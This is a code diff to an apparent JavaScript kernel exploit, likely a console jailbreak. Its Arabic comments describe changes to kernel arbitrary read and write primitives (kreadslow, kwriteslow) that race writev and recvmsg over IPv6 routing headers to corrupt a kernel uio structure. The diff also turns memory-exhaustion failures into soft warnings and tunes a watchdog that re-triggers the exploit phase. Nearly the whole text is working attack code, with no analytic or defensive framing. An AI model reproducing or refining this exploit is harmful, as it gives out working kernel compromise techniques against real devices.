@@ -1094,26 +1094,23 @@ function setup_log_screen() {
  *   Watchdog (progress monitor)
  * =========================== */
 
-function watchdog_start(timeoutMs = 5000) {
+function watchdog_start() {
+  var timeoutMs = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 5000;
   if (WATCHDOG_ACTIVE) return;
   WATCHDOG_ACTIVE = true;
-
   log('[FLOW] Watchdog started (timeout = ' + timeoutMs + 'ms)');
 
   // interval أوسع عشان ندي event loop فرصة يتنفس
   var id = jsmaf.setInterval(() => {
     var delta = Date.now() - WATCHDOG_LAST_TICK;
-
     if (delta > timeoutMs) {
       log('[WD] TIMEOUT — no progress for ' + delta + 'ms');
       log('[FLOW] Watchdog triggered fallback → exploit_phase_trigger');
-
       WATCHDOG_ACTIVE = false;
       jsmaf.clearInterval(id);
 
       // fallback
       yield_to_render(exploit_phase_trigger);
-
       log('[FLOW] Watchdog stopped after timeout');
     }
   }, 1200); // ← بدل 500ms
@@ -1359,18 +1356,20 @@ function leak_kqueue() {
   * ===========================
   */
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  write64(uio.add(0x00), uio_iov); // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
-  write64(uio.add(0x10), new BigInt(0)); // uio_offset
-  write64(uio.add(0x18), size); // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
+  // struct uio
+  write64(uio.add(0x00), uio_iov);          // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM);      // uio_iovcnt
+  write64(uio.add(0x10), new BigInt(0));    // uio_offset
+  write64(uio.add(0x18), size);             // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE);     // uio_segflg
   write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
-  write64(uio.add(0x28), uio_td); // uio_td
+  write64(uio.add(0x28), uio_td);           // uio_td
 
   // أول iovec
-  write64(uio_iov.add(0x00), addr); // iov_base
-  write64(uio_iov.add(0x08), size); // iov_len
+  write64(uio_iov.add(0x00), addr);         // iov_base
+  write64(uio_iov.add(0x08), size);         // iov_len
 }
+
 function kreadslow(addr, size) {
   debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size);
 
@@ -1379,16 +1378,17 @@ function kreadslow(addr, size) {
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
   }
+
   if (!addr || size <= 0) {
     log('[KR] Invalid addr/size');
     return BigInt_Error;
   }
-  if (debugging.info.memory.available === 0) {
-    log('[KR] Warning: memory.available == 0 at start, continuing...');
-  }
   if (!uio_sock_0 || !uio_sock_1) {
     log('[KR] Invalid uio sockets');
     return BigInt_Error;
+  }
+  if (debugging.info.memory.available === 0) {
+    log('[KR] Warning: memory.available == 0 at start, continuing...');
   }
 
   // ضبط SO_SNDBUF وتهيئة الـ socket
@@ -1403,23 +1403,27 @@ function kreadslow(addr, size) {
   var uio_leak_add = leak_rthdr.add(0x08);
   var count = 0;
   var zeroMemoryCount = 0;
+
   while (count < 10000) {
     if (count % 500 === 0) {
       log('[KR] Stage1 progress=' + count);
       watchdog_tick('kreadslow_stage1');
     }
+
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 8) {
-        log('[KR] Memory exhausted in stage1 → returning error');
-        return BigInt_Error;
+        log('[KR] Warning: memory.available == 0 in stage1 (soft fail), continuing...');
+        // ما نرجعش Error هنا، نسيب الفشل يتحكم فيه الفلو الأعلى
       }
     } else {
       zeroMemoryCount = 0;
     }
+
     count++;
     trigger_uio_writev();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
@@ -1433,6 +1437,7 @@ function kreadslow(addr, size) {
     wait_uio_writev();
     write(new BigInt(uio_sock_1), tmp, size);
   }
+
   if (count === 10000) {
     debug('[KR] Stage1 failed after max iterations');
     return BigInt_Error;
@@ -1448,6 +1453,8 @@ function kreadslow(addr, size) {
   free_rthdr(ipv6_socks[triplets[2]]);
   var iov_leak_add = leak_rthdr.add(0x20);
   var count2 = 0;
+  var zeroMemoryCount2 = 0;
+
   while (true) {
     count2++;
     if (count2 > 10000) {
@@ -1455,22 +1462,24 @@ function kreadslow(addr, size) {
       return BigInt_Error;
     }
 
-
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 8) {
-        log('[KR] Memory exhausted in stage2 → returning error');
-        return BigInt_Error;
+        log('[KR] Warning: memory.available == 0 in stage2 (soft fail), continuing...');
+        // برضه ما نرجعش Error هنا مباشرة
       }
     } else {
       zeroMemoryCount2 = 0;
     }
+
     trigger_iov_recvmsg();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
       break;
     }
+
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
@@ -1480,6 +1489,7 @@ function kreadslow(addr, size) {
   read(new BigInt(uio_sock_0), tmp, size);
   var leak_buffer = new BigInt(0);
   var tag_val = new BigInt(0x41414141, 0x41414141);
+
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     read(new BigInt(uio_sock_0), leak_buffers[j], size);
     var val = read64(leak_buffers[j]);
@@ -1488,11 +1498,14 @@ function kreadslow(addr, size) {
       leak_buffer = leak_buffers[j];
     }
   }
+
   wait_uio_writev();
   write(new BigInt(iov_sock_1), tmp, 1);
+
   if (leak_buffer.eq(new BigInt(0))) {
     return BigInt_Error;
   }
+
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
@@ -1501,21 +1514,40 @@ function kreadslow(addr, size) {
   if (triplets[2] === -1) {
     return BigInt_Error;
   }
+
   return leak_buffer;
 }
+
 function kreadslow64(address) {
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
     log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
-    return BigInt_Error; // لا cleanup ولا throw
+    return BigInt_Error; // لا cleanup ولا throw – الفلو فوق هو اللي يقرّر
   }
   return read64(buffer);
 }
+
 function kwriteslow(addr, buffer, size) {
   log('[KW] Enter kwriteslow addr=' + hex(addr));
+
+  if (!addr || size <= 0) {
+    log('[KW] Invalid addr/size');
+    return BigInt_Error;
+  }
+  if (!uio_sock_0 || !uio_sock_1) {
+    log('[KW] Invalid uio sockets');
+    return BigInt_Error;
+  }
+  if (debugging.info.memory.available === 0) {
+    log('[KW] Warning: memory.available == 0 at start, continuing...');
+  }
+
+  // ضبط SO_SNDBUF وتهيئة الـ socket
   write32(sockopt_val_buf, size);
   set_sndbuf_raw(new BigInt(uio_sock_1), size);
   write(new BigInt(uio_sock_1), tmp, size);
+
+  // Set iov length
   write64(uioIovWrite.add(0x08), size);
 
   // Stage1: تجهيز uio في الكيرنل
@@ -1523,43 +1555,37 @@ function kwriteslow(addr, buffer, size) {
   var uio_leak_add = leak_rthdr.add(0x08);
   var count = 0;
   var zeroMemoryCount = 0;
-  if (!addr || size <= 0) {
-    log('[KW] Invalid addr/size');
-    return BigInt_Error;
-  }
-  if (debugging.info.memory.available === 0) {
-    log('[KR] Warning: memory.available == 0 at start, continuing...');
-  }
-  if (!uio_sock_0 || !uio_sock_1) {
-    log('[KW] Invalid uio sockets');
-    return BigInt_Error;
-  }
+
   while (true) {
     if (count % 500 === 0) {
       log('[KW] Stage1 progress=' + count);
       watchdog_tick('kwriteslow_stage1');
     }
+
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 8) {
-        log('[KW] Memory exhausted in stage1 → returning error');
-        return BigInt_Error;
+        log('[KW] Warning: memory.available == 0 in stage1 (soft fail), continuing...');
       }
     } else {
       zeroMemoryCount = 0;
     }
+
     count++;
     trigger_uio_readv();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
     }
+
     for (var i = 0; i < UIO_THREAD_NUM; i++) {
       write(new BigInt(uio_sock_1), buffer, size);
     }
     wait_uio_readv();
   }
+
   var uio_iov = read64(leak_rthdr);
   build_uio(uio_buf, uio_iov, 0, false, addr, size);
 
@@ -1568,37 +1594,45 @@ function kwriteslow(addr, buffer, size) {
   var iov_leak_add = leak_rthdr.add(0x20);
   var count2 = 0;
   var zeroMemoryCount2 = 0;
+
   while (true) {
     if (count2 % 500 === 0) {
       log('[KW] Stage2 progress=' + count2);
       watchdog_tick('kwriteslow_stage2');
     }
+
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 8) {
-        log('[KW] Memory exhausted in stage2 → returning error');
-        return BigInt_Error;
+        log('[KW] Warning: memory.available == 0 in stage2 (soft fail), continuing...');
       }
     } else {
       zeroMemoryCount2 = 0;
     }
+
     count2++;
     trigger_iov_recvmsg();
     sched_yield();
+
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
       break;
     }
+
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
+
+  // Corrupt data
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     write(new BigInt(uio_sock_1), buffer, size);
   }
+
   triplets[1] = find_triplet(triplets[0], -1);
   wait_uio_readv();
   write(new BigInt(iov_sock_1), tmp, 1);
+
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
@@ -1607,6 +1641,7 @@ function kwriteslow(addr, buffer, size) {
   if (triplets[2] === -1) {
     return BigInt_Error;
   }
+
   return new BigInt(0);
 }
 /* ===========================
@@ -1863,19 +1898,16 @@ function retry(label, attempts, fn) {
 function yield_to_render(nextPhase) {
   var phaseName = nextPhase.name || 'anonymous_phase';
   var scheduledAt = Date.now();
-
   log("[FLOW] Scheduling next phase: " + phaseName + " at " + scheduledAt);
 
   // مهم جدًا: نعمل tick هنا
   watchdog_tick('yield_scheduled');
-
   setTimeout(() => {
     var startedAt = Date.now();
     log("[FLOW] ENTER " + phaseName + " (delay: " + (startedAt - scheduledAt) + "ms)");
 
     // tick تاني قبل تنفيذ الفيز
     watchdog_tick('phase_enter');
-
     try {
       nextPhase();
     } catch (e) {
